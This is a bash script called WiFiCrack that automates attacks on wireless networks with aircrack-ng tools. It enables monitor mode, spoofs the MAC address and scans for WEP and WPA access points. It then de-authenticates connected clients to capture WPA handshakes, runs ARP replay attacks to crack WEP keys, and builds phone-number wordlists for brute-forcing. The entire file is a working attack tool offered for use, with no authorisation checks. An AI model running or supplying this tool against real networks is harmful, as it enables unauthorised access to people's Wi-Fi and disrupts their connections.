#!/bin/bash

function help {
clear
echo "----------------------- WiFiCrack HELP -----------------------

1 --> Sets the selected WLAN interface in monitor mode and begins the cracking process.
e --> Enables monitor mode for selected WLAN interface.
d --> Disables monitor mode for selected WLAN interface.
w --> Generate cell phone number wordlist.
h --> Shows this text.
v --> Calls nmcli and displays nearby Access Points.
s --> Shows technical info of the current WLAN interface.
c --> Change current interface (only shows if you have more than one interface)
t --> Test injection quality of the current WLAN interface. Without injection support some commands will not be able to run successfully.
q --> Exits the script.
"
}
function resolve_dependencies {
AIRCRACK=$(command -v aircrack-ng)
NMCLI=$(command -v nmcli)
MACCHANGER=$(command -v macchanger)
XTERM=$(command -v xterm)

if [[ -z "$AIRCRACK" ]] || [[ -z "$NMCLI" ]] || [[ -z "$MACCHANGER" ]] || [[ -z "$XTERM" ]]; then

    DISTRO=$(for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null); do echo ${f:5:${#f}-13}; done;)
    
    if [[ -z "$AIRCRACK" ]]; then
        AIRCRACK="aircrack-ng"
    else
        unset AIRCRACK
    fi

    if [[ -z "$NMCLI" ]]; then
        NMCLI="networkmanager"
    else
        unset NMCLI
    fi

    if [[ -z "$MACCHANGER" ]]; then
        MACCHANGER="macchanger"
    else
        unset MACCHANGER
    fi

    if [[ -z "$XTERM" ]]; then
        XTERM="xterm"
    else
        unset XTERM
    fi

    case $DISTRO in
        arch )
            INSTALL="pacman -S --noconfirm "
            ;;
        gentoo )
            INSTALL="emerge -a "
            ;;
        centos )
            INSTALL="apt-get -y install "
            ;;
        redhat )
            INSTALL="dnf -y install "
            ;;
        LinuxMint )
            INSTALL="apt-get -y install "
            ;;
        debian )
            INSTALL="apt-get -y install "
            ;;
        OpenSUSE )
            INSTALL="zypper -n install "             
            ;;
        fedora )
            INSTALL="dnf -y install "
            ;;
        * )
            echo -ne "Unable to determine Linux Distribution! Install "$AIRCRACK" "$NMCLI" "$MACCHANGER" "$XTERM" manually."
            exit 1
    esac

    read -p "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system, install now ?" DYN
    if [[ "$DYN" = [Yy] ]]; then
        $INSTALL $AIRCRACK $NMCLI $MACCHANGER $XTERM
        resolve_dependencies
    else
        clear
        echo "$AIRCRACK $NMCLI $MACCHANGER $XTERM not found on your system."
        exit 1
    fi
else
    :
fi
}
function cell_phones_wl {
clear
echo "------- Cell Phone number generator, using crunch. -------"
echo
read -p "Enter Phone Number digit length : " LENGTH
read -p "Enter Cell Phone prefix : " PREFIX
read -p "Enter number of recurring digits (Press Enter to skip) : " RECURRING
TMP_1=$(echo ${#PREFIX})
TMP_2=$(expr $LENGTH - $TMP_1 + 1)
TMP_3=$(seq -s% "$TMP_2" | tr -d '[:digit:]')
TMP_4=$(echo $TMP_3 | sed 's/%/X/g')
SUFFIX=".lst"
if [[ -z "$RECURRING" ]]; then
    crunch $LENGTH $LENGTH -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
else
    crunch $LENGTH $LENGTH -d $RECURRING -t $PREFIX$TMP_3 -o $PREFIX$TMP_4$SUFFIX
fi
GEN=$(echo $?)
if [[ "$GEN" -eq 0 ]]; then
    echo "Wordlist successfully generated."
    read -p "Press Enter to go back..." KEY
    unset LENGTH
    unset PREFIX
    unset RECURRING
    unset TMP_1
    unset TMP_2
    unset TMP_3
    unset TMP_4
    unset SUFFIX
    unset GEN
    go_back
else
    echo "Something went wrong, check function \"generate_wordlists\"."
    read -p "Press Enter to go back..." KEY
    unset LENGTH
    unset PREFIX
    unset RECURRING
    unset TMP_1
    unset TMP_2
    unset TMP_3
    unset TMP_4
    unset SUFFIX
    unset GEN
    go_back
fi
}
function generate_wordlists {
CRUNCH=$(command -v crunch)
if [[ -z "$CRUNCH" ]]; then
    echo
    echo "Crunch is not installed. Install it and try again."
    read -p "Press Enter to go back..." KEY
    unset CRUNCH
    go_back
fi
cell_phones_wl
}
function test_injection {
echo
TRY=y
if [[ -n "$STATE" ]]; then
    echo "Testing injection for $IFACE"
    RANGE=$(aireplay-ng -9 $IFACE | grep "Found 0 APs")
    if [[ -n "$RANGE" ]]; then
        while [[ "$TRY" = [Yy] ]]; 
        do
            RANGE=$(aireplay-ng -9 $IFACE | grep "Found 0 APs")
            WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
            if [[ -z "$RANGE" ]]; then
                WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
                if [[ -n "$WORKS" ]]; then
                    echo "WLAN interface ($IFACE) supports injection."
                    echo
                    if [[ "$FLAG" -eq 1 ]]; then
                        echo "Please wait..."
                        echo "Unseting monitor mode on $IFACE."
                        unset_mon >> /dev/null
                    fi
                    unset WORKS
                    unset RANGE
                    unset TRY
                    unset FLAG
                    break
                else
                    echo "WLAN interface ($IFACE) does NOT support injection."
                    echo
                    if [[ "$FLAG" -eq 1 ]]; then
                        echo "Please wait..."
                        echo "Unseting monitor mode on $IFACE."
                        unset_mon >> /dev/null
                    fi
                    unset WORKS
                    unset RANGE
                    unset TRY
                    unset FLAG
                    break
                fi
            else
                echo "Found 0 APs, consider relocating your WLAN interface."
                read -p "Try again ? [yn] " TRY
                unset RANGE
                echo "Please wait..."
                if [[ "$FLAG" -eq 1 ]]; then
                    echo "Please wait..."
                    echo "Unseting monitor mode on $IFACE."
                    unset_mon >> /dev/null
                fi
            fi
        done
    else
        WORKS=$(aireplay-ng -9 $IFACE | grep "Injection is working!")
        if [[ -n "$WORKS" ]]; then
            echo "WLAN interface ($IFACE) supports injection."
            echo
            if [[ "$FLAG" -eq 1 ]]; then
                echo "Please wait..."
                echo "Unseting monitor mode on $IFACE."
                unset_mon >> /dev/null
            fi
            unset WORKS
            unset RANGE
            unset TRY
            unset FLAG
        else
            echo "WLAN interface ($IFACE) does NOT support injection."
            echo
            if [[ "$FLAG" -eq 1 ]]; then
                echo "Please wait..."
                echo "Unseting monitor mode on $IFACE."
                unset_mon >> /dev/null
            fi
            unset WORKS
            unset RANGE
            unset TRY
            unset FLAG
        fi
    fi
else
    echo
    echo "Please wait..."
    echo "Setting monitor mode on $IFACE."
    set_mon >> /dev/null
    FLAG=1
    test_injection
fi
unset WORKS
unset RANGE
unset TRY
unset FLAG
}
function choose_mode {
echo
echo "Select Cracking Mode : "
SELECT="Select : "
echo
echo "1) WEP"
echo "2) WPA1/2"
echo "c) Cancel"
while read -n1 MODE
do
    case $MODE in
        1 )
            MODE=WEP
            list_APs
            wep_attacks
            break
            ;;
        2 )
            MODE=WPA
            list_APs
            wpa_attacks
            break
            ;;
        c )
            go_back
            break
            ;;
        * )
            echo -ne "\nInvalid character '$MODE' entered. $SELECT"
    esac
done
}
function list_APs {
clear
echo "------------------ Access Point Selection ------------------"
echo
echo "Filtered by : $MODE"
if [[ -n $STATE ]]; then
    echo
    echo "Please wait ..."
    unset_mon >> /dev/null #Unseting monitor mode before running nmcli.
    sleep 5
fi
readarray -t LINES < <(nmcli -t -f SSID,CHAN,BSSID,SECURITY,SIGNAL dev wifi list | grep $MODE | sort -u -t: -k1,1 )
if [[ -z "$LINES" ]]; then
    echo "No $MODE Networks found."
    echo
    read -p "Press Enter to go back" KEY
    go_back
else
    echo
    echo "Select an AP and press Enter or Select 1 to rescan"
    echo
    echo "SSID  CHAN    BSSID   SECURITY    SIGNAL"
    select CHOICE in "Scan Again" "${LINES[@]}"; do
        if [[ "$CHOICE" = "Scan Again" ]]; then
            list_APs
        fi
        [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
        break
    done
    read -r AP <<< "$CHOICE)"
    BSSID=$(echo $AP | awk -F ':' '{print $3} {print $4} {print $5} {print $6} {print $7} {print $8}' | sed 's/\\/\:/g' | xargs | sed 's/ //g')
    CHAN=$(echo $AP | awk -F ':' '{print $2}')
    ESSID=$(echo $AP | awk -F ':' '{print $1}')
    #ESSID=$(tr -d ' ' <<< $ESSID)
fi
}
function wpa_attacks {
clear
echo "------------ WPA1/2 4-Way Handshake Capture ------------"
read -p "Press Enter to continue ? " KEY
IFACE=$(ls /sys/class/net | grep $IFACE)
ESSID=$(tr -d ' ' <<< $ESSID)
AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
echo "You need to capture a 4-Way Handshake and then brute-force the .cap file against a wordlist. 
You capture a 4-Way Handshake by forcing an already connected client to de-auth, the client will automatically try to reconnect and in the process will share his/her 4-Way Handshake with all the listening parties. ie. You and the Access Point (Modem/Router). Client MAC is displayed under the STATION collumn in the airodump-ng window. If no clients are connected you cannot capture a Handshake."
echo

read -p "Are any clients connected ? [yn] " ANSWER
if [[ "$ANSWER" = [Yy] ]]; then
    ASN=y
    while [[ "$ASN" != [Nn] ]]; do
        read -p "Enter Client MAC you wish to de-auth and press enter. : " CLIENT
        read -p "How many times ?" TIMES
        aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
        read -p "Try again with same settings [yn] " ASN
        while [[ "$ASN" = [Yy] ]]; do
            aireplay-ng -0 "$TIMES" -a "$BSSID" -c "$CLIENT" "$IFACE"
            read -p "Try again with same settings [yn] " ASN
        done
    done
fi
echo
echo "You need the $ESSID.cap file in order to feed it to aircrack-ng and brute-force the password. Consider keeping it."
read -p "Press Enter to continue..." KEY
clean_up
echo
read -p "Press Enter to go back " KEY
PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
kill $PID
unset ASN
unset PID
unset ESSID
unset AIRODUMP
unset CHAN
unset BSSID
go_back
}
function clean_up {
echo
read -p "Clean up $ESSID.cap, $ESSID.csv, $ESSID.netxml and replay files ? [yn] " ASR
read -p "Keep $ESSID.cap file ? [yn] " ANS
if [[ "$ASR" = [Yy] && "$ANS" = [Yy] ]]; then
    rm -f $ESSID*.netxml
    rm -f $ESSID*.csv
    rm -f replay*.cap
elif [[ "$ASR" = [Yy] && "$ANS" = [Nn] ]]; then
    rm -f $ESSID*.netxml
    rm -f $ESSID*.cap
    rm -f $ESSID*.csv
    rm -f replay*.cap
elif [[ "$ASR" = [Nn] ]]; then
    :
fi
}
#function fragmentation { 
#TODO
#}
function arp_replay {
clear
echo "------------ WEP ARP replay method ------------"
read -p "Press Enter to continue ? " KEY
echo
echo "Setting M/M on $IFACE"
set_mon >> /dev/null
echo
echo "Initiating packet capture"
AIRODUMP="airodump-ng --bssid "$BSSID" -c "$CHAN" -w "$ESSID" "$IFACE""
ESSID=$(tr -d ' ' <<< $ESSID)
echo
env -u SESSION_MANAGER xterm -hold -e $AIRODUMP &
COUNTER=3
until [[ "$COUNTER" -lt 1 ]]; do
    echo "Attempting to Associate to $ESSID... $COUNTER"
    let COUNTER-=1
    SUCCESS=$(aireplay-ng -1 0 -a "$BSSID" -h "$NEWMAC" "$IFACE" | grep "Association successful :-) (AID: 1)")
    if [[ -n $SUCCESS ]]; then
        echo "Association successful!"
        echo "Initiating ARP Replay attack..."
        aireplay-ng -3 -b "$BSSID" -h "$NEWMAC" "$IFACE" &>/dev/null &
        echo
        break
    else
        echo "Association failed, trying again..."
    fi
done
if [[ -z "$SUCCESS" ]]; then
    echo "Unable to Associate, make sure your wlan interface supports injection."
    read -p "Test injection now ? [yn] " INJ
    if [[ "$INJ" = [Yy] ]]; then
        test_injection
    fi
    echo
    echo "In some cases rebooting your computer usually fixes the Association failure."
    echo
    unset ESSID
    unset AIRODUMP
    unset CHAN
    unset BSSID
    read -p "Press Enter to go back" KEY
    go_back
fi
echo "Wait for #Data in airodump-ng to reach at least 15K..."
read -p "Is the #Data collumn increasing ? [yn] " ANS
echo
if [[ "$ANS" = [Yy] ]]; then
    read -p "Try cracking $ESSID now ? [yn] : " ANSWER
    if [[ "$ANSWER" = [Yy] ]]; then
        readarray -t FILES < <(find `pwd` -name "*.cap")
        if [[ -z "$FILES" ]]; then
            echo "No .cap files found."
            echo
            read -p "Press Enter to go back" KEY
            unset ESSID
            unset AIRODUMP
            unset CHAN
            unset BSSID
            go_back
        else
            echo "Select a .cap file to crack"
            select CHOICE in "${FILES[@]}"; do
                [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
                break
            done
            read -r CAP <<< "$CHOICE"
        fi
        echo $CAP
        COMMAND="aircrack-ng "$CAP""
        env -u SESSION_MANAGER xterm -hold -e $COMMAND &
        clear
        echo "Wait for aircrack-ng to finish. The password will be in this form (XX:XX:XX:XX:XX:XX)."
        echo
        read -p "Press Enter to clean up files and go back..." KEY
        PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
        unset PID
        PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
        unset PID
        PID=$(ps aux | grep "xterm -hold -e aircrack-ng" | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
        unset PID
        clean_up
        unset ESSID
        unset AIRODUMP
        unset CHAN
        unset BSSID
        unset ANS
        unset CAP
        unset CHOICE
        unset INJ
        unset ANSWER
        go_back
    else
        PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
        unset PID
        PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
        kill $PID
        unset PID
        clean_up
        read -p "Press Enter to exit and go back. " KEY
        unset ESSID
        unset AIRODUMP
        unset CHAN
        unset BSSID
        unset ANS
        unset CAP
        unset CHOICE
        unset INJ
        unset ANSWER
        go_back
    fi
elif [[ "$ANS" = [Nn] ]]; then
    echo "Consider using Fragmentation attack method."
    #PID=$(ps aux | grep aireplay-ng | grep -v grep | awk -F ' ' '{print $2}')
    #kill $PID
    #unset PID
    PID=$(ps aux | grep "xterm -hold -e airodump-ng" | grep -v grep | awk -F ' ' '{print $2}')
    kill $PID
    unset PID
    clean_up
    read -p "Press Enter to exit and go back. " KEY
    unset ESSID
    unset AIRODUMP
    unset CHAN
    unset BSSID
    go_back
fi
}
function wep_attacks {
clear
echo "-------------- Select Attack Method --------------"
echo
echo "You picked ($AP"
echo
echo "AP Name: "$ESSID
echo "AP Channel: "$CHAN
echo "AP MAC: "$BSSID
echo
PROMPT="Select : "
echo "1) ARP Replay attack"
echo "2) Fragmentation attack"
echo
echo "s) Select different AP"
echo "c) Cancel"
echo
echo -n "$PROMPT"
while read -n1 SEL
do
    case $SEL in
        1 )
            arp_replay
            break
            ;;
        2 )
            #fragmentation
            wep_attacks
            break
            ;;
        s )
            clear
            list_APs
            wep_attacks
            break
            ;;
        c )
            go_back
            break
            ;;
        * )
            echo -ne "\nInvalid character '$SEL' entered. $PROMPT"
    esac
done
}
function show_info {
ADDR=$(iw $IFACE info | grep addr | awk -F ' ' '{print $2}')
TYPE=$(iw $IFACE info | grep \t\y\p\e | awk -F ' ' '{print $2}')
TXPOWER==$(iw $IFACE info | grep txpower | awk -F ' ' '{print $2}{print $3}' | xargs)
NAME=$(iw $IFACE info | grep Interface | awk -F ' ' '{print $2}')
CHANNEL=$(iw $IFACE info | grep channel | awk -F ' ' '{print $2}{print $3}{print $4}' | xargs | sed 's/,//g')
echo "----------------------- WiFi Card Info -----------------------"
echo
echo "Name                          : $NAME"
echo "MAC Addr                      : $ADDR"
echo "Type                          : $TYPE"
echo "Channel                       : $CHANNEL"
echo "Transmit Power                : $TXPOWER"
unset ADDR
unset TYPE
unset TXPOWER
unset NAME
unset CHANNEL
}
function unset_mon {
if [[ -z "$STATE" ]]; then
    echo
    echo "Monitor mode was not set on $IFACE."
    sleep 2
else
    echo
    echo "Disabling Monitor Mode for $IFACE..."
    echo
    echo "Bringing $IFACE down..."
    IFACE=$(ls /sys/class/net | grep $IFACE)
    ifconfig $IFACE down >> /dev/null
    echo "Reverting MAC address to factory default..."
    macchanger -p $IFACE  >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig $IFACE up >> /dev/null
    echo "Disabling monitor mode for $IFACE..."
    airmon-ng stop $IFACE >> /dev/null
    echo "$IFACE is no longer in monitor mode."
    unset STATE
    sleep 2
    IFACE=$(sed 's/mon//g' <<< $IFACE)
fi
}
function set_mon {
if [[ -z "$STATE" ]]; then
    echo
    echo "Setting $IFACE in Monitor Mode..."
    echo
    echo "Creating new interface..."
    airmon-ng start $IFACE >> /dev/null
    IFACE=$(ls /sys/class/net | grep $IFACE)
    echo "Bringing $IFACE down..."
    ifconfig $IFACE down >> /dev/null
    echo "Changing MAC address for $IFACE"
    macchanger -m 00:11:22:33:44:55 $IFACE >> /dev/null
    echo "Bringing $IFACE up..."
    ifconfig $IFACE up >> /dev/null
    NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    STATE=$(echo $IFACE | grep mon)
    echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
else
    echo
    echo "$IFACE already in monitor mode."
    NEWMAC=$(iw $IFACE info | grep addr | awk '{print $2}')
    sleep 2
fi
}
function go_back {
    if [[ "$IFACENUM" -eq 1 ]]; then
        single_interface
    else
        multiple_interfaces
    fi
}
function show_APs {
clear
if [[ -n "$STATE" ]]; then
    unset_mon >> /dev/null
    echo
    echo "Please wait..."
    sleep 5
fi
nmcli dev wifi list
echo
read -p "Rescan ? [yn] " RES
while [[ "$RES" = [Yy] ]]; do
    if [[ "$RES" = [Yy] ]]; then
        show_APs
        break
    else
        break
    fi
done
}
function menu {
clear
if [[ "$IFACENUM" -gt 1 ]]; then
    SWITCH="c) Change Interface"
fi
if [[ -n $STATE ]]; then
    MM=ON
else
    MM=OFF
fi
echo "----------------------- WiFiCrack v0.5_beta -----------------------"
echo "WLAN Interface : $IFACE"
echo "Monitor Mode   : $MM" 
echo
echo "1) Crack"
echo "e) Enable <M/M>"
echo "d) Disable <M/M>"
echo "w) Generate Wordlists"
echo "h) View Help"
echo "v) View APs"
echo "s) Show Info"
if [[ -n "$SWITCH" ]]; then
    echo $SWITCH
fi
echo "t) Test Injection         r) Verbose Test (faster)"
echo "q) Abort!"
echo
PROMPT="Choose : "
echo -n "$PROMPT"
}
function list_ifaces {
clear
readarray -t IFACES < <(ls /sys/class/net | grep wl)
echo "Select an interface (WLAN Card) and press Enter"
select CHOICE in "${IFACES[@]}"; do
    [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
    break
done
read -r IFACE <<< "$CHOICE"
}
function single_interface {
STATE=$(ls /sys/class/net | grep mon)
IFACE=$(ls /sys/class/net | grep wl)
MAC=$(iw $IFACE info | grep addr | awk '{print $2}')
menu
while read -n1 CHAR
do
    case $CHAR in
        1 )
            choose_mode
            break
            ;;
        e )
            set_mon
            echo
            clear
            single_interface
            break
            ;; 
        w )
            generate_wordlists
            break
            ;;
        d )
            unset_mon
            clear
            single_interface
            break
            ;;
        h )
            echo
            help
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        v )
            show_APs
            echo
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        s )
            clear
            show_info
            echo
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        t )
            clear
            test_injection
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        r ) 
            clear
            if [[ -z "$STATE" ]]; then
                echo "Setting Monitor mode on $IFACE..."
                echo
                set_mon >> /dev/null
                FLG=1
                aireplay-ng -9 $IFACE
            else
                aireplay-ng -9 $IFACE
            fi
            if [[ "$FLG" = 1 ]]; then
                echo "Unsetting Monitor mode on $IFACE..."
                echo
                unset_mon >> /dev/null
            fi
            unset FLG
            read -p "Press Enter to go back" KEY
            single_interface
            break
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
    esac
done
}
function multiple_interfaces {
STATE=$(echo $IFACE | grep mon)
menu
while read -n1 CHAR
do
    case $CHAR in
        1 )
            choose_mode
            break
            ;;
        e )
            set_mon
            echo
            clear
            multiple_interfaces
            break
            ;;
        w )
            generate_wordlists
            break
            ;;
        d )
            unset_mon
            clear
            multiple_interfaces
            break
            ;;
        h )
            echo
            help
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        v )
            show_APs
            echo
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        s )
            clear
            show_info
            echo
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        t )
            clear
            test_injection
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        r ) 
            clear
            if [[ -z "$STATE" ]]; then
                echo "Setting Monitor mode on $IFACE..."
                echo
                set_mon >> /dev/null
                FLG=1
                aireplay-ng -9 $IFACE
            else
                aireplay-ng -9 $IFACE
            fi
            if [[ "$FLG" = 1 ]]; then
                echo "Unsetting Monitor mode on $IFACE..."
                echo
                unset_mon >> /dev/null
            fi
            unset FLG
            read -p "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        c )
            list_ifaces
            multiple_interfaces
            break
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\nInvalid character '$CHAR' entered. $PROMPT"
    esac
done
}
function check_root {
if [[ "$EUID" -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi
}
function check_wlan {
IFACENUM=$(ls /sys/class/net/ | grep wl |  wc -l)
if [[ "$IFACENUM" -gt 1 ]]; then
    echo "You have multiple wlan interfaces."
    list_ifaces
    multiple_interfaces
elif [[ "$IFACENUM" -eq 1 ]]; then
    single_interface
elif [[ "$IFACENUM" -eq 0 ]]; then
    echo "No WLAN interfaces found."
fi
}
resolve_dependencies
check_root
check_wlan